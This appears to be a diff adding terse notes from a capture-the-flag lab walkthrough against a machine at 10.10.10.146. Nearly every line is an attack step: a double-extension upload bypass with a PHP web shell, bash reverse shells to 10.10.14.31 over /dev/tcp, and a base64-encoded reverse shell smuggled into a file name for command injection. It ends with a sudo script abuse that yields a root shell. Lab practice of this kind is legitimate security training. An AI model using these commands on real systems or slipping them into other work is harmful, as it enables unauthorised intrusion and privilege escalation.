@@ -1,0 +1,23 @@
+/uploads
+http://10.10.10.146/backup/backup.tar
+
+/upload.php
+file.php.jpg
+<?php echo exec($_GET["cmd"]);?>
+
+/photos.php				//get link of photo for rce
+
+nc -lvnp 9001
+
+/uploads/10_10_14_31.php.jpg?cmd=bash -i >& /dev/tcp/10.10.14.31/9001 0>&1	//got shell as apache
+
+/home/guly/check_attack.php
+
+/var/www/html/uploads
+echo -n  'bash -c "bash -i >& /dev/tcp/10.10.14.31/9002 0>&1"' | base64 -w 0
+touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS85MDAyIDA+JjEiCg== |base64 -d | bash'	//got shell as Guly
+
+sudo -l
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+abc /bin/bash					//got shell as root
